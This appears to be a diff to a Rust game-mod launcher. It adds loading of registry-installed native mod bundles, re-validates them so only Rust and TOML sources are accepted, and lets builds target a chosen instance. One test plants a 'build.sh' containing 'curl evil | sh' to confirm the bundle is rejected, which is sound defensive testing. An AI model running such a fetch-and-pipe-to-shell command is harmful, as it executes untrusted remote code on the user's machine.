@@ -46,7 +46,45 @@ pub fn log_path() -> PathBuf {
 
 const MANIFEST: &str = "horizon-mixin.toml";
 /// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
-const NATIVE_MANIFEST: &str = "horizon-native.json";
+const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
+/// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
+/// off in `horizon-mods.txt` like any mod.
+pub const INSTALLED: &str = "horizon-native-mods";
+
+/// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
+/// Each `.hnmod` is checked again as the registry checks it (only `.rs` and `.toml` under
+/// `mixins/<id>/`, nothing run), so a file edited since its download can't smuggle anything else in.
+pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
+    let out = root().join("installed.incoming");
+    let _ = fs::remove_dir_all(&out);
+    let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
+        .map(|dir| dir.flatten().map(|e| e.path()).collect())
+        .unwrap_or_default();
+    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
+    paths.sort();
+    let mut count = 0;
+    for path in paths {
+        let bundle = horizon_mods::index::native::Bundle::read(&path)
+            .map_err(|e| format!("{}: {e}", path.display()))?;
+        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
+            continue;
+        }
+        let dir = out.join(&bundle.manifest.id);
+        for (name, bytes) in &bundle.files {
+            let to = dir.join(name);
+            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
+            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
+        }
+        count += 1;
+    }
+    if count == 0 {
+        return Err(format!(
+            "No native mod is turned on in {}: install one from the Mods page first.",
+            home.join(INSTALLED).display()
+        ));
+    }
+    Ok(out)
+}
 
 /// A mixin bundle: a folder with a `horizon-mixin.toml`, and the revisions it pins.
 #[derive(Clone, Debug, PartialEq)]
@@ -413,9 +451,15 @@ fn sync(from: &Path, to: &Path) -> Result<(), String> {
 }
 
 /// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
-/// whose game files the build reuses) and points the Native mods instance at the build. Returns
-/// the build's version; a build already made is used again.
-pub fn build(base: &str, folder: &Path, progress: impl Fn(Step)) -> Result<String, String> {
+/// whose game files the build reuses) and points `instance` at the build: the instance the mods
+/// were installed in, else (None, or the game's own home) the Native mods instance. Returns the
+/// build's version; a build already made is used again.
+pub fn build(
+    base: &str,
+    folder: &Path,
+    instance: Option<&Instance>,
+    progress: impl Fn(Step),
+) -> Result<String, String> {
     backend::need_prepared(base)?;
     fs::create_dir_all(root()).map_err(|e| e.to_string())?;
     let _ = fs::write(log_path(), "");
@@ -497,7 +541,10 @@ pub fn build(base: &str, folder: &Path, progress: impl Fn(Step)) -> Result<Strin
         let binary = target.join(PROFILE).join(backend::CLIENT);
         install(base, &version, &binary, &about)?;
     }
-    instance_on(&version)?;
+    match instance.filter(|i| i.kind != instances::Kind::Default) {
+        Some(own) => instances::edit(&own.id, |meta| meta.version = Some(version.clone()))?,
+        None => instance_on(&version)?,
+    };
     prune(&version);
     let _ = fs::remove_dir_all(&incoming);
     Ok(version)
@@ -553,11 +600,15 @@ fn instance_on(version: &str) -> Result<Instance, String> {
     instances::edit(INSTANCE, |meta| meta.version = Some(version.to_owned()))
 }
 
-/// Removes the native builds other than `keep`. The compiled crates (`native/target`) stay, so
-/// the next build only compiles what changed.
+/// Removes the native builds other than `keep` that no instance plays. The compiled crates
+/// (`native/target`) stay, so the next build only compiles what changed.
 pub fn prune(keep: &str) {
+    let played: Vec<String> = instances::list()
+        .into_iter()
+        .filter_map(|i| i.version)
+        .collect();
     for old in backend::installed() {
-        if is_native(&old) && old != keep {
+        if is_native(&old) && old != keep && !played.contains(&old) {
             let _ = backend::remove(&old);
         }
     }
@@ -627,6 +678,39 @@ mod tests {
             (found[0].horizon.as_ref(), found[0].mixins.as_ref()),
             (None, None)
         );
+    }
+
+    #[test]
+    fn installed_mods_are_the_checked_files_of_those_turned_on() {
+        let d = dir("installed-src");
+        write_native(&d, "veinminer", A, B);
+        let home = dir("installed-home");
+        fs::create_dir_all(home.join(INSTALLED)).unwrap();
+        let pack = |name: &str, extra: Option<(&str, &str)>| {
+            let mut zip =
+                zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
+            let options = zip::write::SimpleFileOptions::default();
+            for file in [NATIVE_MANIFEST, "mixins/veinminer/horizon-mixin.toml"] {
+                zip.start_file(file, options).unwrap();
+                zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
+            }
+            if let Some((file, body)) = extra {
+                zip.start_file(file, options).unwrap();
+                zip.write_all(body.as_bytes()).unwrap();
+            }
+            zip.finish().unwrap();
+        };
+        pack("veinminer.hnmod", None);
+        assert!(installed_mods(&home).is_err(), "off until turned on");
+        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
+        let out = installed_mods(&home).unwrap();
+        let found = bundles(&out).unwrap();
+        assert_eq!(
+            (found[0].id.as_str(), found[0].horizon.as_deref()),
+            ("veinminer", Some(A))
+        );
+        pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
+        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
 
     #[test]
